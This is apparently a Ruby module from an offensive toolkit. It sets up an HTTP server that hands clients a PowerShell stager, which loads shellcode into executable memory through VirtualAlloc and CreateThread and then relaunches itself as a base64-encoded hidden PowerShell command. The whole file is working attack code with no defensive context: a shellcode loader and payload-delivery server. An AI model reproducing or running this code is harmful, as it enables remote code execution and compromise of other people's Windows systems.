#!/usr/bin/env ruby
require_relative 'core'
include MainCommands
class Server
  def set_host
    host_name = get_input('Enter the host ip to listen on: ')
    ip = host_name.split('.')
    until !(ip[0].nil? || ip[1].nil? || ip[2].nil? || ip[3].nil?)
      host_name = get_input('Enter the host ip to listen on: ')
      ip = host_name.split('.')
    end
    print_success("Using #{host_name} as server\n")
    host_name
  end

  def set_port
    port = get_input('Enter port [443]: ', 443)
    if !(1..65_535).cover?(port.to_i)
      print_error("Not a valid port\n")
      sleep(1)
      set_port
    else
      print_success("Using #{port}\n")
      port
    end
  end

  def ruby_web_server(port, ssl = nil, host, shellcode)
    time = Time.now.localtime.strftime('%a %d %b %Y %H:%M:%S %Z')
    if ssl
      print_info("Starting SSL Server!\n")
      server = ssl_setup(host, port.to_i)
    else
      print_info("Starting Server!\n")
      server = TCPServer.open(host, port.to_i)
    end
    resp = psh_cmd(shellcode)
    handler(server, time, resp)
  end

  def handler(server, time, resp)
    loop do
      Thread.start(server.accept) do |client|
        print_success("Client connected!\n")
        client.print headers(time, resp)
        client.print "#{resp}\n"
        client.close
      end
    end
  end

  def headers(time, resp)
    ['HTTP/1.1 200 OK',
     "Date: #{time}",
     'Server: Ruby',
     'Content-Type: text/html; charset=iso-8859-1',
     "Content-Length: #{resp.length}\r\n\r\n"].join("\r\n")
  end

  def psh_cmd(shellcode)
    s = %($1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr )
    s << 'VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, '
    s << "uint flProtect);[DllImport(\"kernel32.dll\")]public static extern "
    s << 'IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, '
    s << 'IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, '
    s << "IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern "
    s << "IntPtr memset(IntPtr dest, uint src, uint count);'';$w = Add-Type "
    s << %(-memberDefinition $c -Name "Win32" -namespace Win32Functions )
    s << "-passthru;[Byte[]];[Byte[]]$sc = #{shellcode};$size = 0x1000;if "
    s << '($sc.Length -gt 0x1000){$size = $sc.Length};$x=$w::'
    s << 'VirtualAlloc(0,0x1000,$size,0x40);for ($i=0;$i -le ($sc.Length-1);'
    s << '$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $sc[$i], 1)};$w::'
    s << "CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};';$gq = "
    s << '[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.'
    s << 'GetBytes($1));if([IntPtr]::Size -eq 8){$x86 = $env:SystemRoot + '
    s << %("\\syswow64\\WindowsPowerShell\\v1.0\\powershell";$cmd = "-nop -noni )
    s << %(-enc";iex "& $x86 $cmd $gq"}else{$cmd = "-nop -noni -enc";iex "& )
    s << %(powershell $cmd $gq";})
  end
end
